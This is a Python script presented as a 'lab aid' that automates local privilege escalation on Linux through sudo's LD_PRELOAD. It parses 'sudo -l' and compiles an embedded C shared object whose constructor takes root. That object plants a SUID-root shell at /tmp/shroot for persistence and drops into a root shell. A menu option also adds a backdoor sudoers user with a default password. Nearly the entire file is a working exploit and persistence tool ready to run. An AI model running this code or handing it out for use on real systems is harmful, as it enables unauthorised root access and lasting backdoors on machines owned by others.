#!/usr/bin/env python3
"""
LD_PRELOAD sudo helper — lab aid.

Stdlib only: os, sys, re, subprocess

    python3 ld_preload_check.py

Unlike LD_LIBRARY_PATH this does NOT impersonate a library name.
It forces one extra .so into the root process.

Need: env_keep+=LD_PRELOAD  or  SETENV
Then: sudo LD_PRELOAD=/tmp/preload.so /usr/bin/id

Payload plants /tmp/shroot (SUID root binary). After a crash:
    /tmp/shroot -p
"""

import os
import re
import subprocess
import sys

WORKDIR = "/tmp/ldpreload_lab"
PAYLOAD_C = WORKDIR + "/preload.c"
SO_PATH = "/tmp/preload.so"
SHROOT = "/tmp/shroot"

HIJACK_C = r"""
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static void boom(void) __attribute__((constructor));
void boom(void) {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    FILE *f = fopen("/tmp/pwn.c", "w");
    if (f) {
        fputs("#include <unistd.h>\nint main(){setuid(0);setgid(0);execl(\"/bin/bash\",\"bash\",\"-p\",0);}\n", f);
        fclose(f);
    }
    system("gcc -o /tmp/shroot /tmp/pwn.c >/dev/null 2>&1");
    system("chown root:root /tmp/shroot >/dev/null 2>&1");
    system("chmod 4755 /tmp/shroot >/dev/null 2>&1");
    system("/tmp/shroot -p");
}
"""


def run(cmd, input_text=None):
    return subprocess.run(
        cmd,
        input=input_text,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
    )


def which(name):
    paths = os.environ.get("PATH", "/usr/bin:/bin").split(":")
    for d in paths:
        p = os.path.join(d, name)
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def banner(title):
    print("\n" + "=" * 60)
    print(title)
    print("=" * 60)


def parse_sudo_l(text):
    info = {
        "raw": text,
        "env_keep_ld_library": False,
        "env_keep_ld_preload": False,
        "setenv": False,
        "env_reset": False,
        "all_nopasswd": False,
        "all_cmds": False,
        "binaries": [],
    }
    lower = text.lower()
    if "env_keep+=ld_library_path" in lower:
        info["env_keep_ld_library"] = True
    if "env_keep+=ld_preload" in lower:
        info["env_keep_ld_preload"] = True
    if "env_reset" in lower:
        info["env_reset"] = True
    if re.search(r"\bSETENV\b", text):
        info["setenv"] = True
    if re.search(r"\([^)]*\)\s+NOPASSWD:\s*ALL\b", text):
        info["all_nopasswd"] = True
    if re.search(r"\([^)]*\)\s+ALL\b", text) and re.search(r":\s*ALL\b", text):
        info["all_cmds"] = True

    for m in re.finditer(r"NOPASSWD:\s*(.+)", text):
        chunk = m.group(1).strip()
        if chunk == "ALL":
            continue
        for part in chunk.split(","):
            part = re.sub(r"^\([^)]*\)\s*", "", part.strip())
            if part.startswith("/") and " " not in part:
                info["binaries"].append(part)

    for m in re.finditer(r"\([^)]+\)\s+(/[^\s,]+)", text):
        p = m.group(1)
        if p not in info["binaries"] and p != "ALL":
            info["binaries"].append(p)

    seen = []
    for b in info["binaries"]:
        if b not in seen:
            seen.append(b)
    info["binaries"] = seen
    return info


def sudo_l():
    r = run(["sudo", "-l"])
    if r.returncode != 0:
        print("[!] sudo -l failed.")
        print((r.stderr or r.stdout).strip())
        return None
    return r.stdout


def env_ok(info):
    return info["env_keep_ld_preload"] or info["setenv"]


def write_payload():
    try:
        os.makedirs(WORKDIR)
    except OSError:
        if not os.path.isdir(WORKDIR):
            print("[!] cannot create %s" % WORKDIR)
            return False
    try:
        f = open(PAYLOAD_C, "w")
        f.write(HIJACK_C)
        f.close()
    except OSError as e:
        print("[!] cannot write payload: %s" % e)
        return False
    if not which("gcc"):
        print("[!] gcc not in PATH")
        return False
    return True


def compile_so():
    if not write_payload():
        return None
    r = run(["gcc", "-shared", "-fPIC", "-o", SO_PATH, PAYLOAD_C])
    if r.returncode != 0 or not os.path.isfile(SO_PATH):
        print("[!] compile failed:")
        print(r.stderr or r.stdout)
        return None
    print("[+] wrote %s (%d bytes)" % (SO_PATH, os.path.getsize(SO_PATH)))
    return SO_PATH


def print_shroot_hint():
    print("")
    print("If the binary errors, check persist:")
    print("  ls -l %s" % SHROOT)
    print("  %s -p" % SHROOT)
    print("Need: -rwsr-xr-x 1 root root  ... then id shows uid=0")


def run_hijack(binary):
    print("[*] sudo LD_PRELOAD=%s %s" % (SO_PATH, binary))
    print_shroot_hint()
    os.execvp("sudo", ["sudo", "LD_PRELOAD=%s" % SO_PATH, binary])


def add_sudo_user():
    if os.geteuid() != 0:
        print("[!] not root. Get the shell first (option 2 or %s -p)." % SHROOT)
        return
    name = input("new username [labadmin]: ").strip() or "labadmin"
    pw = input("password [labadmin]: ").strip() or "labadmin"
    if run(["id", name]).returncode != 0:
        run(["useradd", "-m", "-s", "/bin/bash", name])
    run(["chpasswd"], input_text="%s:%s" % (name, pw))
    snip = "/etc/sudoers.d/99-%s" % name
    try:
        f = open(snip, "w")
        f.write("%s ALL=(ALL:ALL) ALL\n" % name)
        f.close()
        os.chmod(snip, 0o440)
    except OSError as e:
        print("[!] cannot write %s: %s" % (snip, e))
        return
    chk = run(["visudo", "-cf", snip])
    if chk.returncode != 0:
        print("[!] visudo -c failed")
        print(chk.stderr)
        try:
            os.remove(snip)
        except OSError:
            pass
        return
    print("[+] %s can sudo ALL. Test: su - %s && sudo -l" % (name, name))


def print_verdict(info):
    banner("sudo -l parse")
    print(info["raw"].rstrip())
    print("")
    print("  env_keep+=LD_PRELOAD      : %s" % info["env_keep_ld_preload"])
    print("  env_keep+=LD_LIBRARY_PATH : %s" % info["env_keep_ld_library"])
    print("  SETENV                    : %s" % info["setenv"])
    print("  env_reset seen            : %s" % info["env_reset"])
    print("  (ALL) NOPASSWD: ALL       : %s" % info["all_nopasswd"])
    print("  binaries                  : %s" % (info["binaries"] or "(none parsed)"))

    if info["all_nopasswd"] or info["all_cmds"]:
        print("\n[!] Unrestricted sudo. Use: sudo -i")
        return "unrestricted"
    if not env_ok(info):
        print("\n[-] DEAD for LD_PRELOAD (need env_keep+=LD_PRELOAD or SETENV).")
        if info["env_keep_ld_library"]:
            print("    LD_LIBRARY_PATH is kept — use ld_library_path_check.py instead.")
        if info["binaries"]:
            print("    Limited sudo still present. GTFOBins:")
            for b in info["binaries"]:
                print("      %s" % b)
        return "dead"
    if not info["binaries"]:
        print("\n[-] env keep set but no binary path parsed. Read sudo -l.")
        return "partial"
    print("\n[+] ALIVE: limited sudo + LD_PRELOAD kept.")
    print("    No ldd / SONAME matching required.")
    return "alive"


def choose_binary(info):
    existing = [b for b in info["binaries"] if os.path.isfile(b)]
    missing = [b for b in info["binaries"] if not os.path.isfile(b)]
    if missing:
        print("[!] not on disk: %s" % ", ".join(missing))
    if not existing:
        print("[!] no sudo binaries found")
        return None
    print("\nSudo binaries:")
    i = 1
    for b in existing:
        print("  %d) %s" % (i, b))
        i += 1
    raw = input("choose [1]: ").strip() or "1"
    try:
        return existing[int(raw) - 1]
    except (ValueError, IndexError):
        print("[!] bad choice")
        return None


def prepare(binary):
    so = compile_so()
    if not so:
        return False
    print("\nPrepared. Run:\n")
    print("  sudo LD_PRELOAD=%s %s" % (SO_PATH, binary))
    print_shroot_hint()
    return True


def menu():
    print("""
What next?
  1) Prepare only (compile /tmp/preload.so, print the sudo command)
  2) Drop into elevated shell (also plants /tmp/shroot)
  3) Create a new sudo user (must already be root)
  q) Quit
""")
    return input("choice: ").strip().lower()


def main():
    banner("LD_PRELOAD check")
    user = os.environ.get("USER") or os.environ.get("LOGNAME") or "?"
    print("user=%s uid=%d euid=%d cwd=%s" % (user, os.getuid(), os.geteuid(), os.getcwd()))

    if os.geteuid() == 0:
        print("[*] already root.")
        if input("create a sudo user anyway? [y/N]: ").strip().lower() == "y":
            add_sudo_user()
        return 0

    text = sudo_l()
    if text is None:
        return 1
    info = parse_sudo_l(text)
    verdict = print_verdict(info)

    if verdict == "unrestricted":
        c = input("run sudo -i now? [Y/n]: ").strip().lower() or "y"
        if c == "y":
            os.execvp("sudo", ["sudo", "-i"])
        return 0
    if verdict == "dead":
        return 2

    binary = choose_binary(info)
    if not binary:
        return 1

    print("\n[*] payload: %s" % SO_PATH)

    while True:
        choice = menu()
        if choice in ("q", "quit"):
            return 0
        if choice == "1":
            prepare(binary)
        elif choice == "2":
            if not prepare(binary):
                return 1
            run_hijack(binary)
        elif choice == "3":
            add_sudo_user()
        else:
            print("pick 1, 2, 3 or q")


if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        print("\n[*] aborted")
        sys.exit(130)
